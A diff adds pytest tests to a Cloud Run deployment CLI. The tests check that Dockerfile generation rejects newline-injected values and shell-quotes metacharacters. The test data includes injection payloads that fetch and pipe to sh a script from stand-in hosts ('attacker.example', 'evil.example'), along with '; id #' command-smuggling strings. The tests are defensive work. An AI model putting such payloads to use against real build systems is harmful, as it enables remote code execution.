@@ -425,3 +425,110 @@ def test_cloud_run_label_merging(
   actual_labels = gcloud_args[labels_idx + 1]
 
   assert actual_labels == expected_labels
+
+
+# Dockerfile injection guards
+_INJECTED_RUN = 'x"\nRUN curl https://attacker.example/x.sh | sh\n#'
+
+
+def _to_cloud_run_kwargs(src_dir: Path, tmp_path: Path) -> Dict[str, Any]:
+  """Returns a legitimate set of `to_cloud_run` arguments."""
+  return {
+      "agent_folder": str(src_dir),
+      "project": "proj",
+      "region": "us-central1",
+      "service_name": "svc",
+      "app_name": "agent",
+      "temp_folder": str(tmp_path),
+      "port": 8080,
+      "trace_to_cloud": False,
+      "otel_to_cloud": False,
+      "with_ui": False,
+      "log_level": "info",
+      "verbosity": "info",
+      "adk_version": "1.2.0",
+  }
+
+
+@pytest.mark.parametrize("field", ["app_name", "project", "region"])
+def test_to_cloud_run_rejects_injected_token(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+    field: str,
+) -> None:
+  """A token carrying a new instruction fails before anything is deployed."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  run_recorder = _Recorder()
+  rmtree_recorder = _Recorder()
+  monkeypatch.setattr(subprocess, "run", run_recorder)
+  monkeypatch.setattr(shutil, "rmtree", rmtree_recorder)
+  kwargs = _to_cloud_run_kwargs(src_dir, tmp_path)
+  kwargs[field] = _INJECTED_RUN
+
+  with pytest.raises(click.ClickException, match=f"Invalid {field}"):
+    cli_deploy.to_cloud_run(**kwargs)
+
+  assert not run_recorder.calls
+  assert not rmtree_recorder.calls
+  assert not (tmp_path / "Dockerfile").exists()
+
+
+@pytest.mark.parametrize(
+    "field, overrides",
+    [
+        ("allow_origins", {"allow_origins": [f"http://a\n{_INJECTED_RUN}"]}),
+        ("trigger_sources", {"trigger_sources": f"pubsub\n{_INJECTED_RUN}"}),
+        (
+            "session_service_uri",
+            {"session_service_uri": f"sqlite:///a\n{_INJECTED_RUN}"},
+        ),
+    ],
+)
+def test_to_cloud_run_rejects_newline_in_cmd_value(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+    field: str,
+    overrides: Dict[str, Any],
+) -> None:
+  """A CMD value carrying a newline fails before anything is deployed."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  run_recorder = _Recorder()
+  monkeypatch.setattr(subprocess, "run", run_recorder)
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  kwargs = _to_cloud_run_kwargs(src_dir, tmp_path)
+  kwargs.update(overrides)
+
+  with pytest.raises(click.ClickException, match=f"Invalid {field}"):
+    cli_deploy.to_cloud_run(**kwargs)
+
+  assert not run_recorder.calls
+  assert not (tmp_path / "Dockerfile").exists()
+
+
+def test_to_cloud_run_shell_quotes_cmd_values(
+    monkeypatch: pytest.MonkeyPatch,
+    agent_dir: AgentDirFixture,
+    tmp_path: Path,
+) -> None:
+  """Shell metacharacters in the CMD values are quoted in the Dockerfile."""
+  src_dir = agent_dir(include_requirements=False, include_env=False)
+  monkeypatch.setattr(subprocess, "run", _Recorder())
+  monkeypatch.setattr(shutil, "rmtree", _Recorder())
+  kwargs = _to_cloud_run_kwargs(src_dir, tmp_path)
+  kwargs.update(
+      allow_origins=["http://a; curl evil.example | sh #"],
+      trigger_sources="pubsub; id #",
+      session_service_uri="sqlite:///a; id #",
+  )
+
+  cli_deploy.to_cloud_run(**kwargs)
+
+  dockerfile_content = (tmp_path / "Dockerfile").read_text()
+  assert (
+      "--allow_origins='http://a; curl evil.example | sh #'"
+      in dockerfile_content
+  )
+  assert "--trigger_sources='pubsub; id #'" in dockerfile_content
+  assert "--session_service_uri='sqlite:///a; id #'" in dockerfile_content
